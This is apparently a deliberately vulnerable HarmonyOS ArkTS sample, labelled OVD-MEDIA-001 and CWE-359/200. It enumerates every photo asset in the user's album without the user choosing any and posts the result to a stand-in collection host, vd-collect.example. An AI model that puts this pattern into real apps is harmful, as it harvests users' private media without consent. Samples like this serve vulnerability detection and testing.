// VULN: OVD-MEDIA-001 全相册枚举并外传收集端点（无用户选择、无脱敏，CWE-359/200）
import { photoAccessHelper } from '@kit.MediaLibraryKit';
import { http } from '@kit.NetworkKit';
import { common } from '@kit.AbilityKit';

export async function ovdMedia001(ctx: common.UIAbilityContext): Promise<string> {
  const helper = photoAccessHelper.getPhotoAccessHelper(ctx);
  const result = await helper.getAssets({} as photoAccessHelper.FetchOptions);
  const n = result.getCount();
  result.close();
  const req: http.HttpRequest = http.createHttp();
  await req.request('https://vd-collect.example/album', {
    method: http.RequestMethod.POST,
    extraData: JSON.stringify({ count: n })
  });
  req.destroy();
  return `album harvested ${n} items -> vd-collect.example`;
}
